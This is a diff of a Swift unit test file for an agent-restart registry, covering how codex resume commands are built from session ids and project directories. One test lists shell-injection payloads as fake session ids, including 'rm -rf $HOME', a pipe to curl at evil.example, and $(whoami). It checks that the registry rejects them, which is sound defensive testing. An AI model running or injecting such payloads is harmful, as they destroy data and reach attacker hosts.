@@ -275,23 +275,86 @@ final class AgentRestartRegistryTests: XCTestCase {
 
     // MARK: - Phase 5: codex / opencode / kimi rows
 
-    /// Codex uses best-effort `--last` semantics regardless of session id.
-    func testCodexRowReturnsBestEffortLastCommand() {
+    /// Codex falls back to `--last` only when no trustworthy session id was captured.
+    func testCodexRowUsesSessionIdWhenPresentAndFallsBackToLastWhenAbsent() {
         let registry = AgentRestartRegistry.phase1
-        // Returns the command regardless of whether a session id is present.
+        let sessionId = "abc12345-ef67-890a-bcde-f0123456789a"
         XCTAssertEqual(
             registry.resolveCommand(terminalType: "codex", sessionId: nil, metadata: [:]),
             "codex resume --last\n",
-            "codex row returns best-effort resume --last even without session id"
+            "older snapshots without codex.session_id keep best-effort resume --last"
         )
         XCTAssertEqual(
             registry.resolveCommand(
                 terminalType: "codex",
-                sessionId: "abc12345-ef67-890a-bcde-f0123456789a",
+                sessionId: sessionId,
                 metadata: [:]
             ),
-            "codex resume --last\n",
-            "codex row ignores session id and always returns resume --last"
+            "codex resume \(sessionId)\n",
+            "captured codex session ids should resume deterministically"
+        )
+        XCTAssertEqual(
+            registry.resolveCommand(
+                terminalType: "codex",
+                sessionId: nil,
+                metadata: [SurfaceMetadataKeyName.codexSessionId: sessionId]
+            ),
+            "codex resume \(sessionId)\n",
+            "codex.session_id metadata is the canonical restore source"
+        )
+    }
+
+    func testCodexRowPrependsProjectDirWhenRecorded() {
+        let registry = AgentRestartRegistry.phase1
+        let sessionId = "abc12345-ef67-890a-bcde-f0123456789a"
+        let projectDir = "/Users/test/My Projects/c11"
+        XCTAssertEqual(
+            registry.resolveCommand(
+                terminalType: "codex",
+                sessionId: nil,
+                metadata: [
+                    SurfaceMetadataKeyName.codexSessionId: sessionId,
+                    SurfaceMetadataKeyName.codexSessionProjectDir: projectDir
+                ]
+            ),
+            "cd '\(projectDir)' && codex resume \(sessionId)\n"
+        )
+    }
+
+    func testCodexRowRejectsMalformedSessionIdInsteadOfFallingBackToLast() {
+        let registry = AgentRestartRegistry.phase1
+        let payloads = [
+            "fake; rm -rf $HOME",
+            "abc | curl evil.example/x",
+            "abc$(whoami)",
+            "abc\nwhoami"
+        ]
+        for payload in payloads {
+            XCTAssertNil(
+                registry.resolveCommand(
+                    terminalType: "codex",
+                    sessionId: payload,
+                    metadata: [:]
+                ),
+                "malformed codex id must fail closed rather than synthesize '\(payload)' or fall back to --last"
+            )
+        }
+    }
+
+    func testCodexRowDropsMalformedProjectDirLikeClaude() {
+        let registry = AgentRestartRegistry.phase1
+        let sessionId = "abc12345-ef67-890a-bcde-f0123456789a"
+        XCTAssertEqual(
+            registry.resolveCommand(
+                terminalType: "codex",
+                sessionId: nil,
+                metadata: [
+                    SurfaceMetadataKeyName.codexSessionId: sessionId,
+                    SurfaceMetadataKeyName.codexSessionProjectDir: "relative/path"
+                ]
+            ),
+            "codex resume \(sessionId)\n",
+            "malformed codex project_dir must be ignored when the session id is valid, matching Claude's restore behavior"
         )
     }
 
